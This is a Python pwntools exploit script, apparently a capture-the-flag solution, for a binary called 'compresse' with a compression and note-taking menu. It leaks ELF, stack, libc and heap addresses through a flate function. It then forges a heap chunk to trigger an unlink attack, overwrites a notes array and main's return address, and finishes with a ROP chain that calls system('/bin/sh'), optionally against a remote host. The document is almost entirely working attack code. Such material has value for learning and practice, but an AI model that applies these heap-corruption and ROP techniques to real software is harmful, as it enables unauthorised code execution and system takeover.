#!/usr/bin/env python3
from pwn import *
import sys
import os
import socks
import socket
# Cre: Broder

binary = "./compresse_patched"
_libc = "./libc.so.6"
_ld = "./ld-2.39.so"
HOST = 'localhost'
port = 1337
_arch = 64

context.log_level = 'info'
context.binary = elf = ELF(binary, checksec=False)


libc = ELF(_libc, checksec=False)
_ld = ELF(_ld, checksec=False)

environ = {
    'LD_PRELOAD': os.path.join(os.getcwd(), './libc.so.6'), 
    'LD_LIBRARY_PATH': os.path.join(os.getcwd(), './')
}

gs = f"""
set solib-search-path {os.getcwd()}
set max-visualize-chunk-size 0x800
b *main
c
b *menu
c
c
b *_int_free_merge_chunk+115
c
"""

info        = lambda msg: log.info(msg)
success     = lambda msg: log.success(msg)
error       = lambda msg: log.error(msg)
sla         = lambda msg, data: io.sendlineafter(msg, data)
sa          = lambda msg, data: io.sendafter(msg, data)
sl          = lambda data: io.sendline(data)
s           = lambda data: io.send(data)
rcu         = lambda data: io.recvuntil(data)
lss         = lambda x   : success('\033[1;31;40m%s -> 0x%x \033[0m' % (x, eval(x)))
uu32        = lambda x   : u32(x.ljust(4,b'\x00'))
uu64        = lambda x   : u64(x.ljust(8,b'\x00'))
def p(_data):
    if(_arch == 64):
        return p64(_data, endian = 'little')
    return p32(_data, endian = 'little')

def stop():
    if args.GDB:
        pause()

def start():
    if args.GDB:
        if args.VSCODE:
            context.terminal = ["/home/broder/.vscode-terminal"]
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(HOST, port)
    else:
        return process(elf.path)

id  = 0

def flate(data):
    sl(b'1')
    sa(b'Enter a string to flate: ', data)
    rcu(b'Flated: ')
    data = rcu(b'\n').strip()
    rcu(b'Enter your choice: ')
    return data

def flate_line(data):
    sl(b'1')
    sla(b'Enter a string to flate: ', data)
    rcu(b'Flated: ')
    data = rcu(b'\n').strip()
    rcu(b'Enter your choice: ')
    return data

def deflate(data):
    sl(b'2')
    sa(b'Enter a string to deflate: ', data)

def allocate(data):
    global id
    sl(b'3')
    sa(b'Enter your note: ', data)
    rcu(b'Enter your choice: ')
    id += 1
    return id - 1

def edit(data):
    sl(b'4')
    sa(b'Edit your note: ', data)
    rcu(b'Enter your choice: ')

def free():
    sl(b'5')
    rcu(b'Enter your choice: ')
    
def view():
    sl(b'6')
    rcu(b'Your note : ')
    data = rcu(b'\n').strip()
    rcu(b'Enter your choice: ')
    return data

def win():
    sl(b'8')
    sl(b'id')
    sl(b'whoami')


def select(index):
    sl(b'7')
    sla(b'Enter a note to select: ', str(index).encode())
    rcu(b'Enter your choice: ')

io = start()
rcu(b'Enter your choice: ')
leak = uu64(flate(b'513a'))
elf_base = leak - 0x21d8
stack = uu64(flate(b'16a' * 1 + b'513a')[16:])
libc_base = libc.address = uu64(flate(b'24a' * 1 + b'513a')[24:]) - 0xad7e2
heap_base = uu64(flate(b'336a' * 1 + b'513a')[336:]) - 0x2a0
notes = elf_base + 0x4040
ret_addr = stack + 0x1d8


lss('leak')
lss('elf_base')
lss('stack')
lss('ret_addr')
lss('libc_base')
lss('heap_base')
lss('notes')

rop = ROP(libc)
pop_rdi = p(rop.find_gadget(['pop rdi', 'ret'])[0])
ret = p(rop.find_gadget(['ret'])[0])
binsh = p(next(libc.search(b'/bin/sh\x00')))
system = p(libc.sym["system"])

rop_chain = [
    pop_rdi,
    binsh,
    ret,
    system
]
shell = b''.join(rop_chain)

# =========================================================
# Create a fake chunk
chunk0 = allocate(b'first chunk')
fake_chunk = p(0) + p(0x411)
fake_chunk += p(notes - 0x18) + p(notes - 0x10)
edit(fake_chunk)

# =========================================================
# Create a fake prev size field
# Trigger unlink attack
chunk1 = allocate(b'second chunk')
flate_line(b'512a')
payload = p(0) * 24
payload += p(0x410) + p(0x420)
edit(payload)

select(chunk1)
free()  # trigger unlink attack

# =========================================================
# Overwrite the notes[]
overwrite = p(0) * 3
overwrite += p(notes) # notes
overwrite += p(ret_addr)
overwrite += p(0) * 2
overwrite += p(0x2) # count
select(chunk0)
edit(overwrite)

# =========================================================
# Overwrite the return address of the main function
select(chunk1)
edit(shell)
win()
io.interactive()